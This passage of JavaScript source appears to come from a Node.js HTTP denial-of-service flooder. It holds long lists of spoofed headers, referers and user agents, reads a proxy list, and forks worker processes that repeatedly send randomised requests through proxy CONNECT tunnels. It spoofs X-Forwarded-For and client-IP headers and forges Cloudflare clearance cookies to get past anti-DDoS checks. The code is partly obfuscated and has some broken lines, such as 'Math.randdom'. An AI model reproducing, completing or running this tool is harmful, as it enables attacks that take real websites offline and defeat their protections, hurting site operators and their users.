"Access-Control-Max-Age: 3600", "X-Cache-Status: MISS", "Vary: Accept-Encoding", "X-GeoIP-Country-Code: US", "X-Do-Not-Track: 1", "X-Request-ID: 12345", "X-Correlation-ID: abcde", "DNT: 1", "X-Device-Type: mobile", "X-Device-OS: Android", "X-Device-Model: Galaxy S10", "X-App-Version: 2.1.0", "X-User-ID: 123", "X-Session-ID: xyz", "X-Feature-Flag: new_feature_enabled", "X-Experiment-ID: experiment_123", "X-Ab-Test: variant_b", "X-Tracking-Consent: accepted", "X-Customer-Segment: premium", "X-User-Role: admin", "X-Client-ID: client_567", "X-Internal-Request: true", "X-Service-Name: backend-api", "X-Backend-Server: server-1", "X-Database-Query: SELECT * FROM users", "X-Cache-Control: no-store", "X-Environment: production", "X-Debug-Mode: false", "X-Remote-IP: 203.0.113.195", "X-Proxy: true", "X-Origin: https://www.example.com", "X-FastCGI-Cache: HIT", "X-Pagination-Total: 1000", "X-Pagination-Page: 5", "X-Pagination-Limit: 20", "X-Notification-Count: 3", "X-Message-ID: msg_123", "X-Notification-Type: alert", "X-Notification-Priority: high", "X-Queue-Depth: 50", "X-Queue-Position: 10", "X-Queue-Status: active", "X-Content-Hash: sha256=abcdef123456", "X-Resource-ID: resource_789", "X-Resource-Type: article", "X-Transaction-ID: tx_456", "X-Transaction-Status: success", "X-Transaction-Amount: $100.00", "X-Transaction-Currency: USD", "X-Transaction-Date: 2024-01-24T12:00:00Z", "X-Payment-Method: credit_card", "X-Payment-Status: authorized", "X-Shipping-Method: express", "X-Shipping-Cost: $10.00", "X-Subscription-Status: active", "X-Subscription-Type: premium", "Sec-CH-UA,Sec-CH-UA-Arch,Sec-CH-UA-Bitness,Sec-CH-UA-Full-Version-List,Sec-CH-UA-Mobile,Sec-CH-UA-Model,Sec-CH-UA-Platform,Sec-CH-UA-Platform-Version,Sec-CH-UA-WoW64"];
const refers = ["https://captcha.request123.xyz/?__cf_chl_tk=FfHpmlpM4i4EZ4rflLFtMgD2WqkoR5pCXfcXro4KcdI-1713811530-0.0.1.1-1322", "http://anonymouse.org/cgi-bin/anon-www.cgi/", 'https://cfcybernews.eu/?__cf_chl_tk=V0gHmpGB_XzSs.8hyrlf.xMbIrYR7CIXMWaHbYDk4qY-1713811672-0.0.1.1-1514', "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", "http://engadget.search.aol.com/search?q=", 'http://engadget.search.aol.com/search?q=query?=query=&q=', "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", 'http://funnymama.com/search?q=', 'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=', 'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/', 'http://go.mail.ru/search?mail.ru=1&q=', "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", "http://jigsaw.w3.org/css-validator/validator?uri=", 'http://jobs.bloomberg.com/search?q=', "http://jobs.leidos.com/search?q=", "http://jobs.rbs.com/jobs/search?q=", 'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=', "http://louis-ddosvn.rhcloud.com/f5.html?v=", "http://millercenter.org/search?q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", 'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/', "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", 'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=', "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", 'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=', "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/", "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=", "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/", "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=", 'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/', "http://search.aol.com/aol/search?q=", "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", "http://validator.w3.org/feed/check.cgi?url=", "http://vk.com/profile.php?redirect=", "http://www.ask.com/web?q=", "http://www.baoxaydung.com.vn/news/vn/search&q=", 'http://www.bestbuytheater.com/events/search?q=', "http://www.bing.com/search?q=", 'http://www.evidence.nhs.uk/search?q=', 'http://www.google.com/?q=', "http://www.google.com/translate?u=", "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=", "http://www.google.ru/url?sa=t&rct=?j&q=&e/", "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", "http://www.pagescoring.com/website-speed-test/?url=", 'http://www.reddit.com/search?q=', 'http://www.search.com/search?q=', "http://www.shodanhq.com/search?q=", "http://www.ted.com/search?q=", 'http://www.topsiteminecraft.com/site/pinterest.com/search?q=', 'http://www.usatoday.com/search/results?q=', "http://www.ustream.tv/search?q=", "http://yandex.ru/yandsearch?text=", "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", 'http://ytmnd.com/search?q=', "https://add.my.yahoo.com/rss?url=", "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://drive.google.com/viewerng/viewer?url=", "https://duckduckgo.com/?q=", "https://google.com/", 'https://help.baidu.com/searchResult?keywords=', "https://play.google.com/store/search?q=", 'https://pornhub.com/', 'https://r.search.yahoo.com/', 'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=', "https://steamcommunity.com/market/search?q=", 'https://vk.com/profile.php?redirect=', "https://www.bing.com/search?q=", "https://www.cia.gov/index.html", "https://www.facebook.com/", "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", "https://www.fbi.com/", 'https://www.google.ad/search?q=', "https://www.google.ae/search?q=", "https://www.google.al/search?q=", 'https://www.google.co.ao/search?q=', "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", "https://www.google.com.ai/search?q=", 'https://www.google.com/search?q=', "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=", "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=", "https://www.npmjs.com/search?q=", "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", "https://www.pinterest.com/search/?q=", "https://www.qwant.com/search?q=", 'https://www.ted.com/search?q=', "https://www.usatoday.com/search/results?q=", "https://www.yandex.com/yandsearch?text=", "https://www.youtube.com/", "https://yandex.ru/", "https://www.google.com/search?q=", "https://check-host.net/", 'https://www.facebook.com/', "https://www.youtube.com/", "https://www.fbi.com/", "https://www.bing.com/search?q=", "https://r.search.yahoo.com/", "https://www.cia.gov/index.html", "https://vk.com/profile.php?redirect=", "https://www.usatoday.com/search/results?q=", "https://help.baidu.com/searchResult?keywords=", 'https://steamcommunity.com/market/search?q=', "https://www.ted.com/search?q=", "https://play.google.com/store/search?q=", "https://www.qwant.com/search?q=", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://www.google.ad/search?q=", "https://www.google.ae/search?q=", "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", 'https://www.google.com.ai/search?q=', "https://www.google.al/search?q=", "https://www.google.am/search?q=", "https://www.google.co.ao/search?q="];
const userAgents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)", "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)", "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", "Python-urllib/2.5", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SearchExpress", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36", "Peach/1.01 (Ubuntu 8.04 LTS; U; en)", "POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SuperBot/4.4.0.60 (Windows XP)", "Uzbl (Webkit 1.3) (Linux i686 [i686])", "Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1", "W3C_Validator/1.305.2.12 libwww-perl/5.64", "W3C_Validator/1.654", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36"];
const Methods = ["GET", "HEAD", "POST", 'PUT', "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH", 'PURGE'];
const queryString = ['', '&', '', '&&', 'and', '=', '+', '?'];
const useragentl = ["(CheckSecurity 2_0)", "(BraveBrowser 5_0)", "(ChromeBrowser 3_0)", "(ChromiumBrowser 4_0)", "(AtakeBrowser 2_0)", "(NasaChecker)", "(CloudFlareIUAM)", "(NginxChecker)", "(AAPanel)", '(AntiLua)', "(FushLua)", "(FBIScan)", "(FirefoxTop)", "(ChinaNet Bot)"];
const mozilla = ["Mozilla/5.0 ", "Mozilla/6.0 ", "Mozilla/7.0 ", "Mozilla/8.0 ", "Mozilla/9.0 "];
const platform = ["Windows", "Macintosh", 'Linux', 'Android', "PlayStation 4", "iPhone", 'iPad', "Windows Phone",, "iOS", "Android", "PlayStation 5", "Xbox One", "Nintendo Switch", "Apple TV", "Amazon Fire TV", "Roku", 'Chromecast', "Smart TV", 'Other'];
const version = ["\"Chromium\";v=\"100\", \"Google Chrome\";v=\"100\", \"Google Chrome\";v=\"107, \"Google Chrome\";v=\"104\", \"Google Chrome\";v=\"109\"", "\"(Not(A:Brand\";v=\"8\", \"Chromium\";v=\"98\", \"Firefox\";v=\"11\", \"Google Chrome\";v=\"72\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Opera\";v=\"86\", \"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\"", "\"Firefox\";v=\"29\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\", \"Google Chrome\";v=\"101\"", "\"Not_A Brand\";v=\"8\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\", \"Presto\";v=\"2.7.62\"", "\"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"86\", \"Chromium\";v=\"86\"", "\"Firefox\";v=\"40\", \"Google Chrome\";v=\"96\", \"Chromium\";v=\"96\", \"Firefox\";v=\"17\"", "\"Google Chrome\";v=\"42\", \"Google Chrome\";v=\"58\", \"Google Chrome\";v=\"51\"", "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"", "\"Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Microsoft Edge\";v=\"96\", \"Firefox\";v=\"24\"", "\"Firefox\";v=\"31\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\", \"Google Chrome\";v=\"112\", \"Google Chrome\";v=\"113\"", "\"Not A Brand\";v=\"99\", \"Not A Brand\";v=\"24\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\", \"Opera GX\";v=\"106\""];
const browsers = ["Microsoft Edge", "Google Chrome", "Firefox", "Safari", "Opera", "Chrome Android", "Samsung Internet", "WebView Android"];
const sechuas = ['Android', "Chrome OS", "Chromium OS", "iOS", "Linux", "macOS", "Unknown", "Windows"];
const RipperSec = Methods[Math.floor(Math.random() * Methods.length)];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var platform1 = platform[Math.floor(Math.random() * platform.length)];
var versi = version[Math.floor(Math.random() * version.length)];
var uap1 = userAgents[Math.floor(Math.floor(Math.random() * userAgents.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var moz = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
var az1 = useragentl[Math.floor(Math.floor(Math.random() * useragentl.length))];
var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = fs.readFileSync(args.proxyFile, "utf-8").toString().split(/\r?\n/);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x1dc768, _0x256212) {
    const _0xa5e623 = "CONNECT " + _0x1dc768.address + ":443 HTTP/1.1\r\nHost: " + _0x1dc768.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x185236 = new Buffer.from(_0xa5e623);
    const _0x230278 = net.connect({
      'host': _0x1dc768.host,
      'port': _0x1dc768.port
    });
    _0x230278.setTimeout(_0x1dc768.timeout * 0x2710);
    _0x230278.setKeepAlive(true, 0x186a0);
    _0x230278.on("connect", () => {
      _0x230278.write(_0x185236);
    });
    _0x230278.on("data", _0x1118ac => {
      const _0x3e012f = _0x1118ac.toString("utf-8");
      const _0x4be9b2 = _0x3e012f.includes("HTTP/1.1 200");
      if (_0x4be9b2 === false) {
        _0x230278.destroy();
        return _0x256212(undefined, "error: invalid response from proxy server");
      }
      return _0x256212(_0x230278, undefined);
    });
    _0x230278.on('timeout', () => {
      _0x230278.destroy();
      return _0x256212(undefined, "error: timeout exceeded");
    });
    _0x230278.on("error", _0x47f31f => {
      _0x230278.destroy();
      return _0x256212(undefined, "error: " + _0x47f31f);
    });
  }
}
var target = process.argv[0x2];
var parsed = url.parse(target);
var host = url.parse(target).host;
const Socker = new NetSocket();
headers[":method"] = RipperSec;
headers[':authority'] = parsedTarget.host;
headers[":path"] = parsedTarget.path + pathts[Math.floor(Math.randdom() * pathts.length)] + '&' + randstr(0xa) + queryString + randstr(0xa);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["cache-control"] = control;
headers['X-Forwarded-For'] = spoofed;
headers['sec-ch-ua'] = versi;
headers["sec-ch-ua-mobile"] = sechuas[Math.floor(Math.random() * sechuas.length)];
headers["sec-ch-ua-platform"] = browsers[Math.floor(Math.random() * browsers.length)] + platform1;
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["upgrade-insecure-requests"] = Math.random() > 0.5;
headers.Connection = Math.random() > 0.5 ? 'keep-alive' : "close";
headers.accept = accept;
headers["sec-fetch-mode"] = 'navigate';
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-user"] = '?1';
headers.TE = "trailers";
headers.cookie = 'cf_clearance=' + randstr(0x20) + '.' + randstr(0xa) + '-' + randstr(0xa) + "-1.0.1.1-" + randstr(0xb) + "_vs_V." + randstr(0x15) + '_' + randstr(0x2f);
headers.cookie = "?__cf_chl_tk=" + randayat(0x2b) + '-' + randnombor(0xa) + "-0.0.1.1" + randnombor(0x4);
headers.cookie = "cf_clearance=jJON9OFgfi5vMsOiVzEoj_zALEfEw_p.NqLBhedD_l8-1713811530-1.0.1.1-FpDUKeox5NHAhC5yknlqtHuyqr4RXg3YkjFJ1MLzWbzDi7Nt09VaEupypw3q.2_yA.53vLZvJS.zEgiET1Grsw";
headers["sec-fetch-site"] = site1;
headers["x-requested-with"] = "XMLHttpRequest";
headers['alt-svc'] = randomHeaders["alt-svc"];
headers.Via = spoofed;
headers.sss = spoofed;
headers["Sec-Websocket-Key"] = spoofed;
headers["Sec-Websocket-Version"] = 0xd;
headers.Upgrade = websocket;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["Client-IP"] = spoofed;
headers["Real-IP"] = spoofed;
headers.Referer = randomReferer;
headers.Referer = Ref;
function runFlooder() {
  const _0x1fb314 = proxies[Math.floor(Math.random() * (proxies.length - 0x0) + 0x0)];
  const _0x45028a = _0x1fb314.split(':');
  headers.origin = "https://" + parsedTarget.host;
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = moz + az1 + uap1;
  const _0x32c453 = {
    'host': _0x45028a[0x0],
    'port': ~~_0x45028a[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x64
  };
